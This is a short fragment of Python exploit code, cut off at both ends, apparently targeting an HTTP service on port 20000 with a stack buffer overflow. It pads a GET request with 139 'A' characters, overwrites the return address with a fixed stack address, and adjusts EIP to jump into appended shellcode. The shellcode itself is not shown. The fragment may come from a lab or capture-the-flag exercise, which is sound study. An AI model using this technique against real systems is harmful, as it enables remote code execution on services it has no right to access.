...
PORT = 20000
PADDING = 'A'*139
RET_ADDRESS = pack('<I', 0xbffff8f8)
REQUEST = 'GET {0}{1} HTTP/1.1\n'.format(PADDING, RET_ADDRESS)
...
# Adjust EIP to point to the beginning of SHELLCODE
REAL_REQUEST = 'GET {0}{1} HTTP/1.1\n{2}'.format(PADDING, pack('<I', 0xbffff8f8+len(REQUEST)), SHELLCODE)
